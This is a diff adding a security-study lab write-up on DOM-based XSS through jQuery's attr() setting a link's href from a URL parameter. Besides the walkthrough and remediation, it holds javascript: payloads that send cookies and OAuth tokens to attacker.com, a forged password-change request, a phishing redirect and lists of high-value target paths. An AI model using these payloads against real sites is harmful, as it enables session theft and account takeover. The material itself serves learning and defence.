@@ -2187,3 +2187,496 @@ If script fails → use event-based payload
 - Focus on execution, not clean structure  
 
 ---
+
+# Lab-6 🐞 DOM-Based XSS via jQuery attr() + location.search into href
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (DOM XSS) happens when:
+
+1️⃣ User input enters through the URL  
+2️⃣ JavaScript reads that input  
+3️⃣ A library (jQuery here) inserts it into the DOM  
+4️⃣ Browser executes it in a dangerous context  
+
+---
+
+### ⚠ Important in this lab
+
+- Vulnerability exists in JavaScript (client-side)  
+- Server only provides a default value (returnPath=/)  
+- Execution happens only when user clicks a link  
+
+---
+
+### 🔄 Flow
+
+User Input  
+→ location.search  
+→ jQuery attr()  
+→ href  
+→ User Click  
+→ JavaScript Execution  
+
+---
+
+## 🔹 What Is This Topic?
+
+This lab demonstrates DOM XSS using:
+
+'jQuery .attr() function'
+
+---
+
+### 🧠 Source
+
+location.search  
+
+👉 Reads user-controlled data from URL:
+
+'?returnPath=INPUT'
+
+---
+
+### 🧠 Sink
+
+'jQuery .attr("href", value)'
+
+👉 Sets the href attribute of a link (unsafe if controlled)
+
+---
+
+### ⚠ Important Behavior
+
+- Browser does NOT execute automatically  
+- Execution happens ONLY when user clicks link  
+- javascript: scheme turns link into executable code  
+
+---
+
+## 🔹 Lab Walkthrough
+
+---
+
+### Step 1 — Open the Lab
+
+Go to Submit Feedback page  
+
+---
+
+### Step 2 — Observe URL
+
+'/feedback?returnPath=/'
+
+👉 Default value = homepage  
+
+---
+
+### Step 3 — Test Input Control
+
+Modify URL:
+
+'/feedback?returnPath=TEST123'
+
+---
+
+### Step 4 — Inspect Live DOM
+
+Open DevTools → Elements  
+
+Find Back link:
+
+'<a href="TEST123">'
+
+---
+
+### Step 5 — Identify Context
+
+👉 Input is inside:
+
+href attribute  
+
+✔ Attribute context  
+✔ URL context  
+
+---
+
+### Step 6 — Identify Source & Sink
+
+Source:
+
+location.search  
+
+Sink:
+
+jQuery .attr("href", value)  
+
+---
+
+### Step 7 — Craft Payload
+
+🎯 Goal:
+
+Make browser execute JavaScript when link is clicked  
+
+---
+
+### ✅ Final Payload
+
+'javascript:alert(document.cookie)'
+
+---
+
+### Step 8 — Inject Payload
+
+Modify URL:
+
+'/feedback?returnPath=javascript:alert(document.cookie)'
+
+---
+
+### Step 9 — DOM Change
+
+Before:
+
+'<a href="/">'
+
+After:
+
+'<a href="javascript:alert(document.cookie)">'
+
+---
+
+### Step 10 — Execution
+
+1️⃣ User clicks Back link  
+2️⃣ Browser detects javascript:  
+3️⃣ Executes JavaScript  
+
+💥 Alert appears  
+
+---
+
+### ✅ Lab solved
+
+---
+
+### 🔹 Exact Payload Used
+
+'javascript:alert(document.cookie)'
+
+---
+
+### 🔹 Where Input Goes
+
+URL → returnPath parameter  
+
+---
+
+### 🔹 Source → Sink → Execution Flow
+
+location.search  
+→ jQuery attr()  
+→ href  
+→ user click  
+→ JS executes  
+
+---
+
+### 🔹 What Changed in DOM
+
+---
+
+Before:
+
+'<a href="/">'
+
+---
+
+After:
+
+'<a href="javascript:alert(document.cookie)">'
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![Payload inside href leading to execution](../images/dom-xss-jquery-execution.png)
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ Redirect / Back Links (VERY COMMON)
+
+Code:
+
+'link.href = userInput'
+
+Payload:
+
+'javascript:alert(1)'
+
+Seen in:
+
+- Login pages  
+- Feedback flows  
+- Checkout redirects  
+
+---
+
+### 🟢 2️⃣ jQuery attr() Misuse (Legacy Goldmine)
+
+'$("#link").attr("href", input)'
+
+Found in:
+
+- Old admin panels  
+- CMS themes  
+- jQuery-heavy dashboards  
+
+---
+
+### 🟢 3️⃣ OAuth / SSO Redirect Abuse (CRITICAL)
+
+'?redirect_uri=INPUT'
+
+Payload:
+
+'javascript:alert(1)'
+
+📌 Impact:
+
+- Account takeover  
+- Token theft  
+- Login hijacking  
+
+---
+
+### 🟢 4️⃣ Email & Notification Links
+
+User-controlled links rendered in:
+
+- Emails  
+- Notifications  
+- Messages  
+
+📌 User clicks → XSS executes  
+
+---
+
+### 🟢 5️⃣ Download / Return Links
+
+'?next='  
+'?continue='  
+'?return='  
+
+Very common in:
+
+- SaaS apps  
+- Payment systems  
+- Subscription flows  
+
+---
+
+### 🟢 6️⃣ SPA Navigation (Modern Apps)
+
+'router.push(userInput)'
+
+📌 Can lead to DOM XSS via dynamic link generation  
+
+---
+
+### 🟢 7️⃣ Admin Panel Click-Based XSS
+
+- Payload sent to admin  
+- Admin clicks link  
+- Full admin compromise  
+
+🔥 HIGH VALUE  
+
+---
+
+## 🎯 High-Value Targets
+
+---
+
+### 🔴 Redirect & Navigation
+
+- /redirect  
+- /next  
+- /return  
+- /continue  
+- /back  
+
+---
+
+### 🔴 Auth / OAuth
+
+- /login  
+- /oauth  
+- /auth  
+- /callback  
+
+---
+
+### 🔴 User Flow Pages
+
+- /checkout  
+- /payment  
+- /subscription  
+- /confirm  
+
+---
+
+### 🔴 Messaging / Email
+
+- /notifications  
+- /messages  
+- /inbox  
+- /email-preview  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Chain 1 — DOM XSS → Session Theft
+
+'javascript:fetch("https://attacker.com?c="+document.cookie)'
+
+→ Steal session  
+→ Hijack account  
+
+---
+
+### 🔥 Chain 2 — DOM XSS → Admin Takeover
+
+1. Inject malicious link  
+2. Send to admin  
+3. Admin clicks  
+4. Full control  
+
+---
+
+### 🔥 Chain 3 — DOM XSS → OAuth Token Theft
+
+'javascript:fetch("https://attacker.com?token="+localStorage.token)'
+
+→ Steal tokens  
+→ Login as victim  
+
+---
+
+### 🔥 Chain 4 — DOM XSS → CSRF Automation
+
+'javascript:fetch("/change-password",{method:"POST"})'
+
+→ Perform actions silently  
+
+---
+
+### 🔥 Chain 5 — DOM XSS → Phishing Redirect
+
+'javascript:location="https://fake-login.com"'
+
+→ Credential harvesting  
+
+---
+
+## 🧪 Methodology
+
+- Identify URL parameters  
+- Inject test value  
+- Inspect DOM for href change  
+- Identify source (location.search)  
+- Identify sink (attr)  
+- Test payload (javascript:alert(1))  
+- Click link  
+- Confirm execution  
+
+---
+
+## ⚠ Why This DOM XSS Is Special
+
+- Requires user interaction (click)  
+- Happens only in browser  
+- Server appears completely safe  
+- Easily missed in automated scans  
+
+---
+
+## 🛡 Remediation
+
+- Validate URLs strictly  
+- Allow only http / https schemes  
+- Block javascript: scheme  
+- Avoid direct assignment to href  
+- Use safe URL constructors  
+- Encode and sanitize input  
+
+---
+
+### ❌ NEVER
+
+- Trust user input in links  
+- Use .attr() with untrusted data  
+- Allow dynamic redirects without validation  
+
+---
+
+## 💡 Notes / Mindset
+
+If you control the link → you control execution  
+
+---
+
+## 🧠 Mental Model
+
+Find source  
+→ Identify sink  
+→ Control attribute  
+→ Inject payload  
+→ Trigger interaction  
+→ Execute  
+
+---
+
+## 💡 Key Difference
+
+Reflected XSS → automatic execution  
+
+Stored XSS → persistent execution  
+
+DOM XSS → user-triggered execution  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+→ Can I control href?  
+→ Is JavaScript inserting my input?  
+→ Will user click this link?  
+→ Can I inject javascript:?  
+
+---
+
+## 💡 Extra Tips
+
+- Always try javascript:alert(1)  
+- Look for jQuery usage (attr, html, append)  
+- Target dynamic links  
+- Test redirect parameters  
+
+---
+
+## 🧠 One-Line Memory Hook
+
+If you control the link, you control the click  
+
+---
